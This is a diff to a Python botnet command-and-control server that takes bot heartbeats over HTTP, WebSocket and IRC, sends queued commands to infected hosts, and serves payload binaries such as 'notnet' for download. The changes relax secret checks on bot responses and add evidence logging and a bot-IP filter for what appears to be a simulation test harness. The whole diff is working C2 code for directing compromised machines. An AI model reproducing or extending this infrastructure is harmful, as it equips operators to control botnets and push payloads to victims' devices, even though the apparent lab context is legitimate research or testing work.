@@ -351,7 +351,10 @@ def handle_http(conn, addr, c2):
             if method == "POST" and path == c2.http_path.rstrip("/"):
                 kind = "heartbeat" if j.get("cmd") == "status" else "response"
                 secret = j.get("secret", "")
-                if secret != c2.secret:
+                # Secret is verified on HEARTBEATS only — the bot's command
+                # responses ({"cmd":...,"result":...}) do NOT carry the
+                # secret. Treat them like the mock does: ack + log.
+                if kind == "heartbeat" and secret != c2.secret:
                     c2.state.add_event("auth_fail",
                                        f"bad secret from {ip} host={j.get('hostname','')}")
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
@@ -360,14 +363,19 @@ def handle_http(conn, addr, c2):
                 c2.state.upsert_bot(j, ip, "http")
                 log(f"HTTP {kind} {ip} host={j.get('hostname','')} tag={j.get('tag','')}")
                 if kind == "heartbeat":
-                    q = next_command(c2.queue_dir, "http", tag=j.get("tag"))
-                    if q is not None:
-                        c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
-                        log(f"SERVE http -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
-                        http_send(conn, json.dumps({"cmd": q.get("cmd", "status"),
-                                                    "args": q.get("args", ""),
-                                                    "secret": c2.secret}))
-                        continue
+                    c2.ev(f"C2 heartbeat from {ip} body={text}")
+                    if c2.is_bot(ip):
+                        q = next_command(c2.queue_dir, "http", tag=j.get("tag"))
+                        if q is not None:
+                            c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
+                            log(f"SERVE http -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
+                            c2.ev(f"SERVE cmd={q.get('cmd')} args={q.get('args')!r}")
+                            http_send(conn, json.dumps({"cmd": q.get("cmd", "status"),
+                                                        "args": q.get("args", ""),
+                                                        "secret": c2.secret}))
+                            continue
+                else:
+                    c2.ev(f"C2 RESP from {ip}: {text}")
                 http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                 continue
 
@@ -384,6 +392,7 @@ def handle_http(conn, addr, c2):
                 http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
                                "application/octet-stream")
                 log(f"PAYLOAD notnet download from {ip}")
+                c2.ev(f"C2 PAYLOAD download from {ip}")
                 continue
             if method == "GET" and path == "/notnet-src.tar":
                 http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
@@ -396,6 +405,7 @@ def handle_http(conn, addr, c2):
                 if os.path.isfile(full):
                     http_send_file(conn, full, "application/octet-stream")
                     log(f"PAYLOAD {fname} download from {ip}")
+                    c2.ev(f"C2 PAYLOAD download from {ip}")
                     continue
 
             http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
@@ -525,6 +535,7 @@ def handle_ws(conn, addr, c2):
             except json.JSONDecodeError:
                 j = {}
             log(f"WS FRAME {ip}: {text[:200]}")
+            c2.ev(f"WS FRAME {ip}: {text[:300]}")
             if j.get("cmd") == "status":
                 if j.get("secret") != c2.secret:
                     c2.state.add_event("auth_fail",
@@ -533,14 +544,17 @@ def handle_ws(conn, addr, c2):
                     ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
                 c2.state.upsert_bot(j, ip, "ws")
-                q = next_command(c2.queue_dir, "ws", tag=j.get("tag"))
-                if q is not None:
-                    c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
-                    log(f"SERVE ws -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
-                    ws_send_text(conn, json.dumps({"cmd": q.get("cmd", "status"),
-                                                   "args": q.get("args", ""),
-                                                   "secret": c2.secret}))
-                    continue
+                if c2.is_bot(ip):
+                    q = next_command(c2.queue_dir, "ws", tag=j.get("tag"))
+                    if q is not None:
+                        c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
+                        log(f"SERVE ws -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
+                        out = json.dumps({"cmd": q.get("cmd", "status"),
+                                          "args": q.get("args", ""),
+                                          "secret": c2.secret})
+                        c2.ev(f"WS SERVE {out}")
+                        ws_send_text(conn, out)
+                        continue
             ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
     except (socket.timeout, ConnectionError, OSError):
         pass
@@ -652,10 +666,12 @@ def handle_irc(conn, addr, c2, nick, channel):
                     c2.state.mark_served(q.get("_id", 0), bot_nick)
                     text = f"{q.get('cmd')} {q.get('args','')}".strip()
                     irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
+                    c2.ev(f"IRC SERVE {text}")
                     log(f"SERVE irc -> {bot_nick} cmd={q.get('cmd')} args={q.get('args','')}")
             try:
                 data = conn.recv(4096).decode(errors="replace")
                 if data:
+                    c2.ev(f"IRC RECV {ip}: {data[:200]}")
                     log(f"IRC RECV {ip}: {data[:300]}")
                     for line in data.split("\r\n"):
                         line = line.strip()
@@ -683,6 +699,7 @@ def handle_irc(conn, addr, c2, nick, channel):
                                     c2.state.mark_served(q.get("_id", 0), hb.get("tag", ""))
                                     text = f"{q.get('cmd')} {q.get('args','')}".strip()
                                     irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
+                                    c2.ev(f"IRC SERVE {text}")
                                     log(f"SERVE irc -> {hb.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
             except socket.timeout:
                 continue
@@ -874,8 +891,30 @@ class C2:
         self.queue_dir = queue_dir
         self.payload_dir = payload_dir
         self.state = State(state_path)
+        # Sim-integration mode (run_sim.py against the real C2):
+        #  SIM_EVIDENCE  — write mock-format evidence lines to this file so
+        #                  the sim driver's grep-based checks see them
+        #  SIM_BOT_IP    — only serve queued commands to heartbeats from this
+        #                  IP (devices heartbeat to the same endpoint and
+        #                  would otherwise steal commands, the #119 race)
+        self.evidence = os.environ.get("SIM_EVIDENCE", "")
+        self.bot_ip = os.environ.get("SIM_BOT_IP", "")
         os.makedirs(queue_dir, exist_ok=True)
         os.makedirs(payload_dir, exist_ok=True)
+
+    def ev(self, line):
+        """Append a sim-mock-format evidence line (SIM_EVIDENCE set only)."""
+        if not self.evidence:
+            return
+        ts = datetime.now(timezone.utc).isoformat()
+        try:
+            with open(self.evidence, "a") as f:
+                f.write(f"{ts} {line}\n")
+        except OSError:
+            pass
+
+    def is_bot(self, ip):
+        return not self.bot_ip or ip == self.bot_ip
 
     def enqueue_command(self, target, cmd, args, source):
         cid = self.state.record_command(target, cmd, args)
